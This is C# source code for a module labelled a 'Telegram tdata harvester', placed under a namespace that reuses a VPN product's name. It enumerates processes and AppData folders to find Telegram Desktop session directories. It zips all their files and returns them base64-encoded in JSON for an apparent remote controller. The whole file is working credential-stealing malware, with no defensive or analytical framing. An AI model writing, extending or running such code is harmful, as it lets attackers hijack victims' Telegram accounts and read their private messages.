// language: C#, file: CredentialsClientModule.cs, target: Windows net472
// Telegram tdata harvester — finds all tdata dirs, zips complete session data (no size filter)
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace mullvad.Module.Credentials
{
    public sealed class CredentialsClientModule
    {
        public static string ModuleId => "mullvad.credentials";

        public string Execute(string action, string payload)
        {
            try
            {
                switch (action)
                {
                    case "find":        return FindTdata();
                    case "collect":     return Collect(payload);
                    case "collect_all": return CollectAll();
                    case "status":      return GetStatus();
                    default:            return Err("Unknown action: " + action);
                }
            }
            catch (Exception ex) { return Err(ex.Message); }
        }

        // find → [{path, size_bytes, file_count}]
        private static string FindTdata()
        {
            var paths = GatherTdataPaths();
            var sb = new StringBuilder("[");
            bool first = true;
            foreach (var p in paths)
            {
                try
                {
                    long bytes = 0;
                    int  count = 0;
                    foreach (var f in Directory.GetFiles(p, "*", SearchOption.AllDirectories))
                    {
                        try { var fi = new FileInfo(f); bytes += fi.Length; count++; } catch { }
                    }
                    if (!first) sb.Append(',');
                    first = false;
                    sb.Append("{\"path\":").Append(Json(p))
                      .Append(",\"size_bytes\":").Append(bytes)
                      .Append(",\"file_count\":").Append(count)
                      .Append("}");
                }
                catch { }
            }
            sb.Append("]");
            return sb.ToString();
        }

        // collect → {"zip":"<base64>","size":<bytes>,"path":"...","file_count":<n>}
        // payload: {"tdata_path":"C:\\...\\tdata"}
        private static string Collect(string payload)
        {
            var doc  = SimpleJson.Parse(payload);
            var path = doc.ContainsKey("tdata_path") ? doc["tdata_path"] : "";
            if (string.IsNullOrEmpty(path) || !Directory.Exists(path))
                return Err("tdata path not found: " + path);

            byte[] zipBytes = ZipDirectoryFull(path, "tdata");
            int    fc       = CountFiles(path);
            return "{\"zip\":\"" + Convert.ToBase64String(zipBytes)
                 + "\",\"size\":" + zipBytes.Length
                 + ",\"file_count\":" + fc
                 + ",\"path\":" + Json(path) + "}";
        }

        // collect_all → all found tdata paths merged into one zip
        private static string CollectAll()
        {
            var paths = GatherTdataPaths();
            if (paths.Count == 0) return Err("No tdata directories found");

            using var ms = new MemoryStream();
            using (var zip = new ZipArchive(ms, ZipArchiveMode.Create, leaveOpen: true))
            {
                foreach (var tdataPath in paths)
                {
                    try
                    {
                        // Each tdata gets its own folder: parent_dir_name_tdata/
                        string parentName = Path.GetFileName(Path.GetDirectoryName(tdataPath) ?? "") ?? "unknown";
                        string entryBase  = SanitizeName(parentName) + "_tdata";
                        AddDirectoryToZip(zip, tdataPath, entryBase);
                    }
                    catch { }
                }
            }
            var bytes = ms.ToArray();
            return "{\"zip\":\"" + Convert.ToBase64String(bytes)
                 + "\",\"size\":" + bytes.Length
                 + ",\"path_count\":" + paths.Count + "}";
        }

        // status → quick summary (is Telegram running, how many tdata found)
        private static string GetStatus()
        {
            var  paths   = GatherTdataPaths();
            bool running = IsTelegramRunning();
            var  sb      = new StringBuilder("{");
            sb.Append("\"running\":").Append(running ? "true" : "false");
            sb.Append(",\"tdata_count\":").Append(paths.Count);
            sb.Append(",\"paths\":[");
            bool first = true;
            foreach (var p in paths) { if (!first) sb.Append(','); first = false; sb.Append(Json(p)); }
            sb.Append("]}");
            return sb.ToString();
        }

        // ── Discovery ─────────────────────────────────────────────────────────

        private static List<string> GatherTdataPaths()
        {
            var found = new ConcurrentDictionary<string, byte>(StringComparer.OrdinalIgnoreCase);

            // AppData / LocalAppData top-level subdirs containing "tdata"
            var appRoots = new[]
            {
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            };
            Parallel.ForEach(appRoots, root =>
            {
                if (string.IsNullOrEmpty(root) || !Directory.Exists(root)) return;
                try
                {
                    foreach (var dir1 in Directory.EnumerateDirectories(root, "*", SearchOption.TopDirectoryOnly))
                    {
                        try
                        {
                            var candidate = Path.Combine(dir1, "tdata");
                            if (Directory.Exists(candidate))
                                found.TryAdd(Path.GetFullPath(candidate), 0);
                        }
                        catch { }
                    }
                }
                catch { }
            });

            // Known Telegram Desktop install paths
            var knownParents = new[]
            {
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),   "Telegram Desktop"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Telegram Desktop"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),      "Telegram Desktop"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),   "Telegram Desktop"),
            };
            foreach (var parent in knownParents)
            {
                if (!Directory.Exists(parent)) continue;
                var td = Path.Combine(parent, "tdata");
                if (Directory.Exists(td)) found.TryAdd(Path.GetFullPath(td), 0);
            }

            // Live Telegram.exe process paths → walk up looking for tdata sibling
            SearchProcessPaths(found);

            return new List<string>(found.Keys);
        }

        private static void SearchProcessPaths(ConcurrentDictionary<string, byte> found)
        {
            try
            {
                var pids = new uint[4096];
                if (!EnumProcesses(pids, (uint)(pids.Length * 4), out var needed)) return;
                int count = (int)(needed / 4);

                Parallel.For(0, count, i =>
                {
                    uint pid = pids[i];
                    if (pid == 0 || pid == 4) return;
                    IntPtr hProc = OpenProcess(0x1410u, false, (int)pid);
                    if (hProc == IntPtr.Zero) return;
                    try
                    {
                        var sb = new StringBuilder(1024);
                        uint sz = (uint)sb.Capacity;
                        if (!QueryFullProcessImageName(hProc, 0, sb, ref sz)) return;
                        string exePath = sb.ToString(0, (int)sz);
                        string exeName = Path.GetFileNameWithoutExtension(exePath);
                        if (!exeName.Equals("Telegram", StringComparison.OrdinalIgnoreCase)) return;

                        string? dir = Path.GetDirectoryName(exePath);
                        for (int up = 0; up < 3 && dir != null; up++)
                        {
                            var td = Path.Combine(dir, "tdata");
                            if (Directory.Exists(td)) { found.TryAdd(Path.GetFullPath(td), 0); break; }
                            dir = Path.GetDirectoryName(dir);
                        }
                    }
                    catch { }
                    finally { CloseHandle(hProc); }
                });
            }
            catch { }
        }

        private static bool IsTelegramRunning()
        {
            try
            {
                var procs = Process.GetProcessesByName("Telegram");
                bool found = procs.Length > 0;
                foreach (var p in procs) p.Dispose();
                return found;
            }
            catch { return false; }
        }

        // ── ZIP helpers ────────────────────────────────────────────────────────

        private static byte[] ZipDirectoryFull(string dirPath, string entryBase)
        {
            using var ms = new MemoryStream();
            using (var zip = new ZipArchive(ms, ZipArchiveMode.Create, leaveOpen: true))
                AddDirectoryToZip(zip, dirPath, entryBase);
            return ms.ToArray();
        }

        private static void AddDirectoryToZip(ZipArchive zip, string dirPath, string entryBase)
        {
            foreach (var file in Directory.GetFiles(dirPath, "*", SearchOption.AllDirectories))
            {
                try
                {
                    string rel       = file.Length > dirPath.Length
                        ? file.Substring(dirPath.Length).TrimStart('\\', '/')
                        : Path.GetFileName(file);
                    string entryName = entryBase + "/" + rel.Replace('\\', '/');
                    zip.CreateEntryFromFile(file, entryName, CompressionLevel.Fastest);
                }
                catch { }
            }
        }

        private static int CountFiles(string dirPath)
        {
            try { return Directory.GetFiles(dirPath, "*", SearchOption.AllDirectories).Length; }
            catch { return 0; }
        }

        private static string SanitizeName(string s)
        {
            var sb = new StringBuilder();
            var bad = Path.GetInvalidFileNameChars();
            foreach (char c in s) sb.Append(Array.IndexOf(bad, c) >= 0 ? '_' : c);
            return sb.Length > 0 ? sb.ToString() : "unknown";
        }

        // ── P/Invoke ──────────────────────────────────────────────────────────
        [DllImport("kernel32.dll")] static extern bool EnumProcesses(uint[] lpidProcess, uint cb, out uint lpcbNeeded);
        [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint dwAccess, bool bInheritHandle, int dwProcessId);
        [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr hObject);
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        static extern bool QueryFullProcessImageName(IntPtr hProcess, uint dwFlags, StringBuilder lpExeName, ref uint lpdwSize);

        // ── JSON helpers ───────────────────────────────────────────────────────
        private static string Err(string msg)
            => "{\"success\":false,\"error\":\"" + msg.Replace("\\","\\\\").Replace("\"","\\\"").Replace("\r","").Replace("\n"," ") + "\"}";

        private static string Json(string s)
        {
            if (s == null) return "null";
            return "\"" + s.Replace("\\","\\\\").Replace("\"","\\\"").Replace("\r","\\r").Replace("\n","\\n").Replace("\t","\\t") + "\"";
        }
    }

    internal static class SimpleJson
    {
        internal static Dictionary<string, string> Parse(string json)
        {
            var result = new Dictionary<string, string>(StringComparer.Ordinal);
            if (string.IsNullOrWhiteSpace(json)) return result;
            json = json.Trim();
            if (json.StartsWith("{")) json = json.Substring(1, json.Length - 2);
            int i = 0;
            while (i < json.Length)
            {
                while (i < json.Length && (json[i] == ',' || json[i] == ' ' || json[i] == '\r' || json[i] == '\n' || json[i] == '\t')) i++;
                if (i >= json.Length) break;
                var key = ReadString(json, ref i);
                while (i < json.Length && (json[i] == ':' || json[i] == ' ')) i++;
                var value = ReadValue(json, ref i);
                if (key != null && value != null) result[key] = value;
            }
            return result;
        }
        private static string? ReadString(string s, ref int i)
        {
            if (i >= s.Length || s[i] != '"') return null;
            i++;
            var sb = new StringBuilder();
            while (i < s.Length && s[i] != '"')
            {
                if (s[i] == '\\' && i + 1 < s.Length) { i++; switch(s[i]){ case '"': sb.Append('"'); break; case '\\': sb.Append('\\'); break; case 'n': sb.Append('\n'); break; case 'r': sb.Append('\r'); break; default: sb.Append(s[i]); break; } }
                else sb.Append(s[i]);
                i++;
            }
            if (i < s.Length) i++;
            return sb.ToString();
        }
        private static string? ReadValue(string s, ref int i)
        {
            if (i >= s.Length) return null;
            if (s[i] == '"') return ReadString(s, ref i);
            var start = i;
            while (i < s.Length && s[i] != ',' && s[i] != '}') i++;
            return s.Substring(start, i - start).Trim();
        }
    }
}
